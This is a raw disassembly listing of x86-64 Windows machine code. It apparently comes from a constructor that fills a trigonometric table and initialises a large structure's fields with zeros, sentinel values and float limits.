   140001730:	66 0f 6e f7          	movd   %edi,%xmm6
   140001734:	0f 5b f6             	cvtdq2ps %xmm6,%xmm6
   140001737:	f3 0f 58 f6          	addss  %xmm6,%xmm6
   14000173b:	f3 0f 59 f7          	mulss  %xmm7,%xmm6
   14000173f:	f3 41 0f 5e f0       	divss  %xmm8,%xmm6
   140001744:	0f 28 c6             	movaps %xmm6,%xmm0
   140001747:	e8 3b e1 03 00       	call   0x14003f887
   14000174c:	f3 0f 11 06          	movss  %xmm0,(%rsi)
   140001750:	0f 28 c6             	movaps %xmm6,%xmm0
   140001753:	e8 47 e1 03 00       	call   0x14003f89f
   140001758:	f3 0f 11 46 04       	movss  %xmm0,0x4(%rsi)
   14000175d:	ff c7                	inc    %edi
   14000175f:	48 83 c6 08          	add    $0x8,%rsi
   140001763:	83 ff 30             	cmp    $0x30,%edi
   140001766:	7c c8                	jl     0x140001730
   140001768:	f3 0f 10 05 1c 6a 04 	movss  0x46a1c(%rip),%xmm0        # 0x14004818c
   14000176f:	00 
   140001770:	e8 12 e1 03 00       	call   0x14003f887
   140001775:	f3 0f 10 0d 67 6a 04 	movss  0x46a67(%rip),%xmm1        # 0x1400481e4
   14000177c:	00 
   14000177d:	f3 0f 5c c8          	subss  %xmm0,%xmm1
   140001781:	f3 41 0f 10 46 18    	movss  0x18(%r14),%xmm0
   140001787:	f3 0f 5e c1          	divss  %xmm1,%xmm0
   14000178b:	f3 41 0f 11 86 c0 01 	movss  %xmm0,0x1c0(%r14)
   140001792:	00 00 
   140001794:	48 89 ab 50 3e 00 00 	mov    %rbp,0x3e50(%rbx)
   14000179b:	48 89 ab 58 3e 00 00 	mov    %rbp,0x3e58(%rbx)
   1400017a2:	48 89 ab 60 3e 00 00 	mov    %rbp,0x3e60(%rbx)
   1400017a9:	48 89 ab 68 3e 00 00 	mov    %rbp,0x3e68(%rbx)
   1400017b0:	48 89 ab 78 3e 00 00 	mov    %rbp,0x3e78(%rbx)
   1400017b7:	48 89 ab 80 3e 00 00 	mov    %rbp,0x3e80(%rbx)
   1400017be:	48 89 ab 88 3e 00 00 	mov    %rbp,0x3e88(%rbx)
   1400017c5:	48 89 ab 90 3e 00 00 	mov    %rbp,0x3e90(%rbx)
   1400017cc:	48 89 ab 98 3e 00 00 	mov    %rbp,0x3e98(%rbx)
   1400017d3:	48 89 ab a0 3e 00 00 	mov    %rbp,0x3ea0(%rbx)
   1400017da:	48 89 ab a8 3e 00 00 	mov    %rbp,0x3ea8(%rbx)
   1400017e1:	48 89 ab b0 3e 00 00 	mov    %rbp,0x3eb0(%rbx)
   1400017e8:	48 89 ab b8 3e 00 00 	mov    %rbp,0x3eb8(%rbx)
   1400017ef:	48 89 ab c0 3e 00 00 	mov    %rbp,0x3ec0(%rbx)
   1400017f6:	48 89 ab cc 3e 00 00 	mov    %rbp,0x3ecc(%rbx)
   1400017fd:	48 89 ab 00 3f 00 00 	mov    %rbp,0x3f00(%rbx)
   140001804:	48 89 ab 10 3f 00 00 	mov    %rbp,0x3f10(%rbx)
   14000180b:	48 89 ab 18 3f 00 00 	mov    %rbp,0x3f18(%rbx)
   140001812:	48 89 ab 4c 3f 00 00 	mov    %rbp,0x3f4c(%rbx)
   140001819:	48 8d 83 80 3f 00 00 	lea    0x3f80(%rbx),%rax
   140001820:	b9 8c 00 00 00       	mov    $0x8c,%ecx
   140001825:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000182c:	00 00 00 00 
   140001830:	48 c7 00 ff ff ff ff 	movq   $0xffffffffffffffff,(%rax)
   140001837:	66 c7 40 08 00 00    	movw   $0x0,0x8(%rax)
   14000183d:	48 8d 40 0c          	lea    0xc(%rax),%rax
   140001841:	48 83 e9 01          	sub    $0x1,%rcx
   140001845:	75 e9                	jne    0x140001830
   140001847:	48 8d 8b 10 46 00 00 	lea    0x4610(%rbx),%rcx
   14000184e:	48 89 4c 24 78       	mov    %rcx,0x78(%rsp)
   140001853:	48 89 a9 18 01 00 00 	mov    %rbp,0x118(%rcx)
   14000185a:	48 89 a9 20 01 00 00 	mov    %rbp,0x120(%rcx)
   140001861:	48 89 a9 28 01 00 00 	mov    %rbp,0x128(%rcx)
   140001868:	48 89 a9 30 01 00 00 	mov    %rbp,0x130(%rcx)
   14000186f:	e8 1c fb ff ff       	call   0x140001390
   140001874:	90                   	nop
   140001875:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001878:	33 c0                	xor    %eax,%eax
   14000187a:	0f 11 83 60 47 00 00 	movups %xmm0,0x4760(%rbx)
   140001881:	89 83 70 47 00 00    	mov    %eax,0x4770(%rbx)
   140001887:	0f 11 83 74 47 00 00 	movups %xmm0,0x4774(%rbx)
   14000188e:	0f 11 83 84 47 00 00 	movups %xmm0,0x4784(%rbx)
   140001895:	0f 11 83 94 47 00 00 	movups %xmm0,0x4794(%rbx)
   14000189c:	48 89 83 a4 47 00 00 	mov    %rax,0x47a4(%rbx)
   1400018a3:	89 83 ac 47 00 00    	mov    %eax,0x47ac(%rbx)
   1400018a9:	0f 11 83 b0 47 00 00 	movups %xmm0,0x47b0(%rbx)
   1400018b0:	0f 11 83 c0 47 00 00 	movups %xmm0,0x47c0(%rbx)
   1400018b7:	0f 11 83 d0 47 00 00 	movups %xmm0,0x47d0(%rbx)
   1400018be:	0f 11 83 e0 47 00 00 	movups %xmm0,0x47e0(%rbx)
   1400018c5:	0f 11 83 f0 47 00 00 	movups %xmm0,0x47f0(%rbx)
   1400018cc:	0f 11 83 00 48 00 00 	movups %xmm0,0x4800(%rbx)
   1400018d3:	0f 11 83 10 48 00 00 	movups %xmm0,0x4810(%rbx)
   1400018da:	48 89 ab 20 48 00 00 	mov    %rbp,0x4820(%rbx)
   1400018e1:	48 89 ab 28 48 00 00 	mov    %rbp,0x4828(%rbx)
   1400018e8:	48 89 ab 30 48 00 00 	mov    %rbp,0x4830(%rbx)
   1400018ef:	48 89 ab 38 48 00 00 	mov    %rbp,0x4838(%rbx)
   1400018f6:	48 89 ab 40 48 00 00 	mov    %rbp,0x4840(%rbx)
   1400018fd:	48 89 ab 48 48 00 00 	mov    %rbp,0x4848(%rbx)
   140001904:	48 89 ab 50 48 00 00 	mov    %rbp,0x4850(%rbx)
   14000190b:	48 89 ab 58 48 00 00 	mov    %rbp,0x4858(%rbx)
   140001912:	48 89 ab 60 48 00 00 	mov    %rbp,0x4860(%rbx)
   140001919:	48 89 ab 68 48 00 00 	mov    %rbp,0x4868(%rbx)
   140001920:	48 89 ab 70 48 00 00 	mov    %rbp,0x4870(%rbx)
   140001927:	48 89 ab 78 48 00 00 	mov    %rbp,0x4878(%rbx)
   14000192e:	48 89 ab 80 48 00 00 	mov    %rbp,0x4880(%rbx)
   140001935:	48 89 ab 88 48 00 00 	mov    %rbp,0x4888(%rbx)
   14000193c:	48 89 ab 90 48 00 00 	mov    %rbp,0x4890(%rbx)
   140001943:	48 89 ab 98 48 00 00 	mov    %rbp,0x4898(%rbx)
   14000194a:	48 89 ab a8 48 00 00 	mov    %rbp,0x48a8(%rbx)
   140001951:	48 89 ab b0 48 00 00 	mov    %rbp,0x48b0(%rbx)
   140001958:	48 89 ab 10 49 00 00 	mov    %rbp,0x4910(%rbx)
   14000195f:	48 89 ab 18 49 00 00 	mov    %rbp,0x4918(%rbx)
   140001966:	48 89 ab 00 49 00 00 	mov    %rbp,0x4900(%rbx)
   14000196d:	48 89 ab 08 49 00 00 	mov    %rbp,0x4908(%rbx)
   140001974:	89 ab 20 49 00 00    	mov    %ebp,0x4920(%rbx)
   14000197a:	c7 83 2c 49 00 00 ff 	movl   $0x7f7fffff,0x492c(%rbx)
   140001981:	ff 7f 7f 
   140001984:	c7 83 28 49 00 00 ff 	movl   $0x7f7fffff,0x4928(%rbx)
   14000198b:	ff 7f 7f 
   14000198e:	c7 83 24 49 00 00 ff 	movl   $0x7f7fffff,0x4924(%rbx)
   140001995:	ff 7f 7f 
   140001998:	48 89 ab 4c 49 00 00 	mov    %rbp,0x494c(%rbx)
   14000199f:	48 89 ab 54 49 00 00 	mov    %rbp,0x4954(%rbx)
   1400019a6:	48 89 ab 5c 49 00 00 	mov    %rbp,0x495c(%rbx)
   1400019ad:	48 89 ab 64 49 00 00 	mov    %rbp,0x4964(%rbx)
   1400019b4:	48 89 ab 88 49 00 00 	mov    %rbp,0x4988(%rbx)
   1400019bb:	48 89 ab 90 49 00 00 	mov    %rbp,0x4990(%rbx)
   1400019c2:	48 89 ab 78 49 00 00 	mov    %rbp,0x4978(%rbx)
   1400019c9:	48 89 ab 80 49 00 00 	mov    %rbp,0x4980(%rbx)
   1400019d0:	89 ab 98 49 00 00    	mov    %ebp,0x4998(%rbx)
   1400019d6:	c7 83 a4 49 00 00 ff 	movl   $0x7f7fffff,0x49a4(%rbx)
   1400019dd:	ff 7f 7f 
   1400019e0:	c7 83 a0 49 00 00 ff 	movl   $0x7f7fffff,0x49a0(%rbx)
   1400019e7:	ff 7f 7f 
   1400019ea:	c7 83 9c 49 00 00 ff 	movl   $0x7f7fffff,0x499c(%rbx)
   1400019f1:	ff 7f 7f 
   1400019f4:	48 89 ab b8 49 00 00 	mov    %rbp,0x49b8(%rbx)
   1400019fb:	48 89 ab c0 49 00 00 	mov    %rbp,0x49c0(%rbx)
   140001a02:	48 89 ab a8 49 00 00 	mov    %rbp,0x49a8(%rbx)
   140001a09:	48 89 ab b0 49 00 00 	mov    %rbp,0x49b0(%rbx)
   140001a10:	89 ab c8 49 00 00    	mov    %ebp,0x49c8(%rbx)
   140001a16:	c7 83 d4 49 00 00 ff 	movl   $0x7f7fffff,0x49d4(%rbx)
   140001a1d:	ff 7f 7f 
   140001a20:	c7 83 d0 49 00 00 ff 	movl   $0x7f7fffff,0x49d0(%rbx)
   140001a27:	ff 7f 7f 
   140001a2a:	c7 83 cc 49 00 00 ff 	movl   $0x7f7fffff,0x49cc(%rbx)
   140001a31:	ff 7f 7f 
   140001a34:	48 89 ab e8 49 00 00 	mov    %rbp,0x49e8(%rbx)
   140001a3b:	48 89 ab f0 49 00 00 	mov    %rbp,0x49f0(%rbx)
   140001a42:	48 89 ab d8 49 00 00 	mov    %rbp,0x49d8(%rbx)
   140001a49:	48 89 ab e0 49 00 00 	mov    %rbp,0x49e0(%rbx)
   140001a50:	89 ab f8 49 00 00    	mov    %ebp,0x49f8(%rbx)
   140001a56:	c7 83 04 4a 00 00 ff 	movl   $0x7f7fffff,0x4a04(%rbx)
   140001a5d:	ff 7f 7f 
   140001a60:	c7 83 00 4a 00 00 ff 	movl   $0x7f7fffff,0x4a00(%rbx)
   140001a67:	ff 7f 7f 
   140001a6a:	c7 83 fc 49 00 00 ff 	movl   $0x7f7fffff,0x49fc(%rbx)
   140001a71:	ff 7f 7f 
   140001a74:	48 89 ab 18 4a 00 00 	mov    %rbp,0x4a18(%rbx)
   140001a7b:	48 89 ab 20 4a 00 00 	mov    %rbp,0x4a20(%rbx)
   140001a82:	48 89 ab 08 4a 00 00 	mov    %rbp,0x4a08(%rbx)
   140001a89:	48 89 ab 10 4a 00 00 	mov    %rbp,0x4a10(%rbx)
   140001a90:	89 ab 28 4a 00 00    	mov    %ebp,0x4a28(%rbx)
   140001a96:	c7 83 34 4a 00 00 ff 	movl   $0x7f7fffff,0x4a34(%rbx)
   140001a9d:	ff 7f 7f 
   140001aa0:	c7 83 30 4a 00 00 ff 	movl   $0x7f7fffff,0x4a30(%rbx)
   140001aa7:	ff 7f 7f 
   140001aaa:	c7 83 2c 4a 00 00 ff 	movl   $0x7f7fffff,0x4a2c(%rbx)
   140001ab1:	ff 7f 7f 
   140001ab4:	48 89 ab 64 4a 00 00 	mov    %rbp,0x4a64(%rbx)
   140001abb:	48 89 ab 6c 4a 00 00 	mov    %rbp,0x4a6c(%rbx)
   140001ac2:	48 89 ab 94 4a 00 00 	mov    %rbp,0x4a94(%rbx)
   140001ac9:	48 89 ab 88 4a 00 00 	mov    %rbp,0x4a88(%rbx)
   140001ad0:	89 ab 90 4a 00 00    	mov    %ebp,0x4a90(%rbx)
   140001ad6:	0f 11 83 a0 4a 00 00 	movups %xmm0,0x4aa0(%rbx)
   140001add:	0f 11 83 b0 4a 00 00 	movups %xmm0,0x4ab0(%rbx)
   140001ae4:	66 89 83 c0 4a 00 00 	mov    %ax,0x4ac0(%rbx)
   140001aeb:	c7 83 9c 4a 00 00 ff 	movl   $0xffffffff,0x4a9c(%rbx)
   140001af2:	ff ff ff 
   140001af5:	88 83 c2 4a 00 00    	mov    %al,0x4ac2(%rbx)
   140001afb:	48 89 ab c8 4a 00 00 	mov    %rbp,0x4ac8(%rbx)
   140001b02:	48 89 ab d0 4a 00 00 	mov    %rbp,0x4ad0(%rbx)
   140001b09:	48 89 ab f8 4a 00 00 	mov    %rbp,0x4af8(%rbx)
   140001b10:	48 89 ab 00 4b 00 00 	mov    %rbp,0x4b00(%rbx)
   140001b17:	48 89 ab 20 4b 00 00 	mov    %rbp,0x4b20(%rbx)
   140001b1e:	48 89 ab 28 4b 00 00 	mov    %rbp,0x4b28(%rbx)
   140001b25:	48 89 ab 40 4b 00 00 	mov    %rbp,0x4b40(%rbx)
   140001b2c:	48 89 ab 48 4b 00 00 	mov    %rbp,0x4b48(%rbx)
   140001b33:	48 89 ab 50 4b 00 00 	mov    %rbp,0x4b50(%rbx)
   140001b3a:	48 89 ab 58 4b 00 00 	mov    %rbp,0x4b58(%rbx)
   140001b41:	48 89 ab 60 4b 00 00 	mov    %rbp,0x4b60(%rbx)
   140001b48:	48 89 ab 68 4b 00 00 	mov    %rbp,0x4b68(%rbx)
   140001b4f:	48 89 ab 70 4b 00 00 	mov    %rbp,0x4b70(%rbx)
   140001b56:	48 89 ab 78 4b 00 00 	mov    %rbp,0x4b78(%rbx)
   140001b5d:	48 89 ab 80 4b 00 00 	mov    %rbp,0x4b80(%rbx)
   140001b64:	48 89 ab 88 4b 00 00 	mov    %rbp,0x4b88(%rbx)
   140001b6b:	48 89 ab 90 4b 00 00 	mov    %rbp,0x4b90(%rbx)
   140001b72:	48 89 ab a0 4b 00 00 	mov    %rbp,0x4ba0(%rbx)
   140001b79:	48 89 ab a8 4b 00 00 	mov    %rbp,0x4ba8(%rbx)
   140001b80:	48 89 ab b0 4b 00 00 	mov    %rbp,0x4bb0(%rbx)
   140001b87:	48 89 ab b8 4b 00 00 	mov    %rbp,0x4bb8(%rbx)
   140001b8e:	48 89 ab c0 4b 00 00 	mov    %rbp,0x4bc0(%rbx)
   140001b95:	48 89 ab c8 4b 00 00 	mov    %rbp,0x4bc8(%rbx)
   140001b9c:	48 89 ab d0 4b 00 00 	mov    %rbp,0x4bd0(%rbx)
   140001ba3:	48 89 ab d8 4b 00 00 	mov    %rbp,0x4bd8(%rbx)
   140001baa:	48 89 ab e0 4b 00 00 	mov    %rbp,0x4be0(%rbx)
   140001bb1:	48 89 ab 0c 4c 00 00 	mov    %rbp,0x4c0c(%rbx)
   140001bb8:	48 8d 8b 20 4c 00 00 	lea    0x4c20(%rbx),%rcx
   140001bbf:	33 d2                	xor    %edx,%edx
   140001bc1:	41 b8 88 0e 00 00    	mov    $0xe88,%r8d
   140001bc7:	e8 e8 da 03 00       	call   0x14003f6b4
   140001bcc:	90                   	nop
   140001bcd:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001bd0:	33 c0                	xor    %eax,%eax
   140001bd2:	0f 11 83 a8 5a 00 00 	movups %xmm0,0x5aa8(%rbx)
   140001bd9:	48 89 83 b8 5a 00 00 	mov    %rax,0x5ab8(%rbx)
   140001be0:	48 89 ab c0 5a 00 00 	mov    %rbp,0x5ac0(%rbx)
   140001be7:	48 89 ab c8 5a 00 00 	mov    %rbp,0x5ac8(%rbx)
   140001bee:	48 89 ab d8 5a 00 00 	mov    %rbp,0x5ad8(%rbx)
   140001bf5:	48 89 ab e0 5a 00 00 	mov    %rbp,0x5ae0(%rbx)
   140001bfc:	48 89 ab e8 5a 00 00 	mov    %rbp,0x5ae8(%rbx)
   140001c03:	48 89 ab f0 5a 00 00 	mov    %rbp,0x5af0(%rbx)
   140001c0a:	48 89 ab d0 5a 00 00 	mov    %rbp,0x5ad0(%rbx)
   140001c11:	c7 83 12 5b 00 00 ff 	movl   $0xffffffff,0x5b12(%rbx)
   140001c18:	ff ff ff 
   140001c1b:	48 89 ab 18 5b 00 00 	mov    %rbp,0x5b18(%rbx)
   140001c22:	66 89 ab 16 5b 00 00 	mov    %bp,0x5b16(%rbx)
   140001c29:	48 89 ab f8 5a 00 00 	mov    %rbp,0x5af8(%rbx)
   140001c30:	48 89 ab 00 5b 00 00 	mov    %rbp,0x5b00(%rbx)
   140001c37:	48 89 ab 08 5b 00 00 	mov    %rbp,0x5b08(%rbx)
   140001c3e:	66 89 ab 10 5b 00 00 	mov    %bp,0x5b10(%rbx)
   140001c45:	88 83 20 5b 00 00    	mov    %al,0x5b20(%rbx)
   140001c4b:	48 c7 83 24 5b 00 00 	movq   $0x3f800000,0x5b24(%rbx)
   140001c52:	00 00 80 3f 
   140001c56:	48 89 ab 2c 5b 00 00 	mov    %rbp,0x5b2c(%rbx)
   140001c5d:	66 89 83 34 5b 00 00 	mov    %ax,0x5b34(%rbx)
   140001c64:	48 89 ab 54 5b 00 00 	mov    %rbp,0x5b54(%rbx)
   140001c6b:	48 89 ab 5c 5b 00 00 	mov    %rbp,0x5b5c(%rbx)
   140001c72:	0f 11 83 64 5b 00 00 	movups %xmm0,0x5b64(%rbx)
   140001c79:	0f 11 83 74 5b 00 00 	movups %xmm0,0x5b74(%rbx)
   140001c80:	0f 11 83 84 5b 00 00 	movups %xmm0,0x5b84(%rbx)
   140001c87:	48 89 ab b8 5b 00 00 	mov    %rbp,0x5bb8(%rbx)
   140001c8e:	48 89 ab c0 5b 00 00 	mov    %rbp,0x5bc0(%rbx)
   140001c95:	48 89 ab c8 5b 00 00 	mov    %rbp,0x5bc8(%rbx)
   140001c9c:	48 89 ab d0 5b 00 00 	mov    %rbp,0x5bd0(%rbx)
   140001ca3:	0f 11 83 d8 5b 00 00 	movups %xmm0,0x5bd8(%rbx)
   140001caa:	0f 57 c9             	xorps  %xmm1,%xmm1
   140001cad:	0f 11 8b e8 5b 00 00 	movups %xmm1,0x5be8(%rbx)
   140001cb4:	48 89 ab 00 5c 00 00 	mov    %rbp,0x5c00(%rbx)
   140001cbb:	48 89 ab 08 5c 00 00 	mov    %rbp,0x5c08(%rbx)
   140001cc2:	48 89 ab 10 5c 00 00 	mov    %rbp,0x5c10(%rbx)
   140001cc9:	48 89 ab 18 5c 00 00 	mov    %rbp,0x5c18(%rbx)
   140001cd0:	48 89 ab 20 5c 00 00 	mov    %rbp,0x5c20(%rbx)
   140001cd7:	48 89 ab 28 5c 00 00 	mov    %rbp,0x5c28(%rbx)
   140001cde:	48 89 ab 30 5c 00 00 	mov    %rbp,0x5c30(%rbx)
   140001ce5:	48 89 ab 38 5c 00 00 	mov    %rbp,0x5c38(%rbx)
   140001cec:	48 89 ab 40 5c 00 00 	mov    %rbp,0x5c40(%rbx)
   140001cf3:	48 89 ab 48 5c 00 00 	mov    %rbp,0x5c48(%rbx)
   140001cfa:	48 89 ab a8 5c 00 00 	mov    %rbp,0x5ca8(%rbx)
   140001d01:	48 89 ab b0 5c 00 00 	mov    %rbp,0x5cb0(%rbx)
   140001d08:	48 89 ab e0 5c 00 00 	mov    %rbp,0x5ce0(%rbx)
   140001d0f:	48 89 ab e8 5c 00 00 	mov    %rbp,0x5ce8(%rbx)
   140001d16:	48 89 ab f0 5c 00 00 	mov    %rbp,0x5cf0(%rbx)
   140001d1d:	48 89 ab f8 5c 00 00 	mov    %rbp,0x5cf8(%rbx)
   140001d24:	89 ab 00 5d 00 00    	mov    %ebp,0x5d00(%rbx)
   140001d2a:	89 83 14 5d 00 00    	mov    %eax,0x5d14(%rbx)
   140001d30:	c7 83 18 5d 00 00 00 	movl   $0x10100,0x5d18(%rbx)
   140001d37:	01 01 00 
   140001d3a:	48 c7 83 1c 5d 00 00 	movq   $0xffffffffffffffff,0x5d1c(%rbx)
   140001d41:	ff ff ff ff 
   140001d45:	0f 11 83 28 5d 00 00 	movups %xmm0,0x5d28(%rbx)
   140001d4c:	0f 11 83 38 5d 00 00 	movups %xmm0,0x5d38(%rbx)
   140001d53:	48 89 83 48 5d 00 00 	mov    %rax,0x5d48(%rbx)
   140001d5a:	c7 83 4c 5d 00 00 ff 	movl   $0xff7fffff,0x5d4c(%rbx)
   140001d61:	ff 7f ff 
   140001d64:	48 89 ab 58 5e 00 00 	mov    %rbp,0x5e58(%rbx)
   140001d6b:	48 89 ab 60 5e 00 00 	mov    %rbp,0x5e60(%rbx)
   140001d72:	48 89 9b f8 0d 00 00 	mov    %rbx,0xdf8(%rbx)
   140001d79:	48 89 9b 18 4c 00 00 	mov    %rbx,0x4c18(%rbx)
   140001d80:	66 c7 03 00 01       	movw   $0x100,(%rbx)
   140001d85:	48 89 ab 08 3c 00 00 	mov    %rbp,0x3c08(%rbx)
   140001d8c:	48 89 ab 10 3c 00 00 	mov    %rbp,0x3c10(%rbx)
   140001d93:	48 8b 05 66 da 04 00 	mov    0x4da66(%rip),%rax        # 0x14004f800
   140001d9a:	48 85 c0             	test   %rax,%rax
   140001d9d:	74 06                	je     0x140001da5
   140001d9f:	ff 80 ec 00 00 00    	incl   0xec(%rax)
   140001da5:	b9 a0 04 00 00       	mov    $0x4a0,%ecx
   140001daa:	ff 15 60 f6 03 00    	call   *0x3f660(%rip)        # 0x140041410
   140001db0:	48 8b f8             	mov    %rax,%rdi
   140001db3:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140001db8:	48 8d 44 24 78       	lea    0x78(%rsp),%rax
   140001dbd:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140001dc2:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   140001dc7:	48 85 ff             	test   %rdi,%rdi
   140001dca:	74 49                	je     0x140001e15
   140001dcc:	48 8d 87 88 00 00 00 	lea    0x88(%rdi),%rax
   140001dd3:	b9 40 00 00 00       	mov    $0x40,%ecx
   140001dd8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001ddf:	00 
   140001de0:	48 89 28             	mov    %rbp,(%rax)
   140001de3:	48 89 68 08          	mov    %rbp,0x8(%rax)
   140001de7:	48 8d 40 10          	lea    0x10(%rax),%rax
   140001deb:	48 83 e9 01          	sub    $0x1,%rcx
   140001def:	75 ef                	jne    0x140001de0
   140001df1:	33 d2                	xor    %edx,%edx
   140001df3:	41 b8 a0 04 00 00    	mov    $0x4a0,%r8d
   140001df9:	48 8b cf             	mov    %rdi,%rcx
   140001dfc:	e8 b3 d8 03 00       	call   0x14003f6b4
   140001e01:	c7 47 14 01 00 00 00 	movl   $0x1,0x14(%rdi)
   140001e08:	48 c7 87 94 04 00 00 	movq   $0xffffffffffffffff,0x494(%rdi)
   140001e0f:	ff ff ff ff 
   140001e13:	eb 03                	jmp    0x140001e18
   140001e15:	48 8b fd             	mov    %rbp,%rdi
   140001e18:	48 89 7b 38          	mov    %rdi,0x38(%rbx)
   140001e1c:	48 89 ab 28 3e 00 00 	mov    %rbp,0x3e28(%rbx)
   140001e23:	89 ab 30 3e 00 00    	mov    %ebp,0x3e30(%rbx)
   140001e29:	48 c7 83 34 3e 00 00 	movq   $0xffffffffffffffff,0x3e34(%rbx)
   140001e30:	ff ff ff ff 
   140001e34:	c7 83 3d 3e 00 00 00 	movl   $0x0,0x3e3d(%rbx)
   140001e3b:	00 00 00 
   140001e3e:	c6 83 3c 3e 00 00 00 	movb   $0x0,0x3e3c(%rbx)
   140001e45:	48 89 ab 48 3e 00 00 	mov    %rbp,0x3e48(%rbx)
   140001e4c:	89 ab 70 3e 00 00    	mov    %ebp,0x3e70(%rbx)
   140001e52:	c7 83 74 3e 00 00 01 	movl   $0x1,0x3e74(%rbx)
   140001e59:	00 00 00 
   140001e5c:	89 ab c8 3e 00 00    	mov    %ebp,0x3ec8(%rbx)
   140001e62:	48 89 ab d8 3e 00 00 	mov    %rbp,0x3ed8(%rbx)
   140001e69:	48 89 ab e0 3e 00 00 	mov    %rbp,0x3ee0(%rbx)
   140001e70:	48 89 ab e8 3e 00 00 	mov    %rbp,0x3ee8(%rbx)
   140001e77:	48 89 ab f0 3e 00 00 	mov    %rbp,0x3ef0(%rbx)
   140001e7e:	48 89 ab f8 3e 00 00 	mov    %rbp,0x3ef8(%rbx)
   140001e85:	c7 83 08 3f 00 00 ff 	movl   $0xffffffff,0x3f08(%rbx)
   140001e8c:	ff ff ff 
   140001e8f:	89 ab 0c 3f 00 00    	mov    %ebp,0x3f0c(%rbx)
   140001e95:	48 89 ab 20 3f 00 00 	mov    %rbp,0x3f20(%rbx)
   140001e9c:	89 ab 28 3f 00 00    	mov    %ebp,0x3f28(%rbx)
   140001ea2:	66 c7 83 2c 3f 00 00 	movw   $0x0,0x3f2c(%rbx)
   140001ea9:	00 00 
   140001eab:	48 89 ab 30 3f 00 00 	mov    %rbp,0x3f30(%rbx)
   140001eb2:	48 89 ab 38 3f 00 00 	mov    %rbp,0x3f38(%rbx)
   140001eb9:	48 89 ab 40 3f 00 00 	mov    %rbp,0x3f40(%rbx)
   140001ec0:	66 c7 83 48 3f 00 00 	movw   $0x0,0x3f48(%rbx)
   140001ec7:	00 00 
   140001ec9:	c7 83 4c 3f 00 00 00 	movl   $0xbf800000,0x3f4c(%rbx)
   140001ed0:	00 80 bf 
   140001ed3:	c7 83 50 3f 00 00 00 	movl   $0xbf800000,0x3f50(%rbx)
   140001eda:	00 80 bf 
   140001edd:	48 89 ab 58 3f 00 00 	mov    %rbp,0x3f58(%rbx)
   140001ee4:	89 ab 60 3f 00 00    	mov    %ebp,0x3f60(%rbx)
   140001eea:	c7 83 64 3f 00 00 ff 	movl   $0xffffffff,0x3f64(%rbx)
   140001ef1:	ff ff ff 
   140001ef4:	89 ab 68 3f 00 00    	mov    %ebp,0x3f68(%rbx)
   140001efa:	66 c7 83 6c 3f 00 00 	movw   $0x0,0x3f6c(%rbx)
   140001f01:	00 00 
   140001f03:	48 89 ab 70 3f 00 00 	mov    %rbp,0x3f70(%rbx)
   140001f0a:	48 89 ab 78 3f 00 00 	mov    %rbp,0x3f78(%rbx)
   140001f11:	89 ab 48 47 00 00    	mov    %ebp,0x4748(%rbx)
   140001f17:	c6 83 4c 47 00 00 00 	movb   $0x0,0x474c(%rbx)
   140001f1e:	48 89 ab 50 47 00 00 	mov    %rbp,0x4750(%rbx)
   140001f25:	89 ab 58 47 00 00    	mov    %ebp,0x4758(%rbx)
   140001f2b:	89 ab a0 48 00 00    	mov    %ebp,0x48a0(%rbx)
   140001f31:	48 89 ab b8 48 00 00 	mov    %rbp,0x48b8(%rbx)
   140001f38:	48 89 ab cc 48 00 00 	mov    %rbp,0x48cc(%rbx)
   140001f3f:	48 89 ab c4 48 00 00 	mov    %rbp,0x48c4(%rbx)
   140001f46:	89 ab c0 48 00 00    	mov    %ebp,0x48c0(%rbx)
   140001f4c:	48 89 ab e4 48 00 00 	mov    %rbp,0x48e4(%rbx)
   140001f53:	48 89 ab d8 48 00 00 	mov    %rbp,0x48d8(%rbx)
   140001f5a:	89 ab d4 48 00 00    	mov    %ebp,0x48d4(%rbx)
   140001f60:	89 ab e0 48 00 00    	mov    %ebp,0x48e0(%rbx)
   140001f66:	48 c7 83 ec 48 00 00 	movq   $0x2,0x48ec(%rbx)
   140001f6d:	02 00 00 00 
   140001f71:	c7 83 f4 48 00 00 00 	movl   $0x10000,0x48f4(%rbx)
   140001f78:	00 01 00 
   140001f7b:	66 c7 83 f8 48 00 00 	movw   $0x0,0x48f8(%rbx)
   140001f82:	00 00 
   140001f84:	c6 83 fa 48 00 00 00 	movb   $0x0,0x48fa(%rbx)
   140001f8b:	66 c7 83 30 49 00 00 	movw   $0x0,0x4930(%rbx)
   140001f92:	00 00 
   140001f94:	c6 83 32 49 00 00 00 	movb   $0x0,0x4932(%rbx)
   140001f9b:	48 89 ab 34 49 00 00 	mov    %rbp,0x4934(%rbx)
   140001fa2:	89 ab 3c 49 00 00    	mov    %ebp,0x493c(%rbx)
   140001fa8:	48 c7 83 44 49 00 00 	movq   $0xffffffffffffffff,0x4944(%rbx)
   140001faf:	ff ff ff ff 
   140001fb3:	c7 83 40 49 00 00 ff 	movl   $0xffffffff,0x4940(%rbx)
   140001fba:	ff ff ff 
   140001fbd:	48 89 ab 6c 49 00 00 	mov    %rbp,0x496c(%rbx)
   140001fc4:	89 ab 74 49 00 00    	mov    %ebp,0x4974(%rbx)
   140001fca:	c7 83 38 4a 00 00 00 	movl   $0x1200,0x4a38(%rbx)
   140001fd1:	12 00 00 
   140001fd4:	c7 83 3c 4a 00 00 00 	movl   $0x3200,0x4a3c(%rbx)
   140001fdb:	32 00 00 
   140001fde:	48 89 ab 50 4a 00 00 	mov    %rbp,0x4a50(%rbx)
   140001fe5:	48 89 ab 48 4a 00 00 	mov    %rbp,0x4a48(%rbx)
   140001fec:	48 89 ab 40 4a 00 00 	mov    %rbp,0x4a40(%rbx)
   140001ff3:	48 89 ab 58 4a 00 00 	mov    %rbp,0x4a58(%rbx)
   140001ffa:	c6 83 60 4a 00 00 00 	movb   $0x0,0x4a60(%rbx)
   140002001:	89 ab 74 4a 00 00    	mov    %ebp,0x4a74(%rbx)
   140002007:	66 c7 83 79 4a 00 00 	movw   $0x0,0x4a79(%rbx)
   14000200e:	00 00 
   140002010:	c6 83 78 4a 00 00 00 	movb   $0x0,0x4a78(%rbx)
   140002017:	89 ab 7c 4a 00 00    	mov    %ebp,0x4a7c(%rbx)
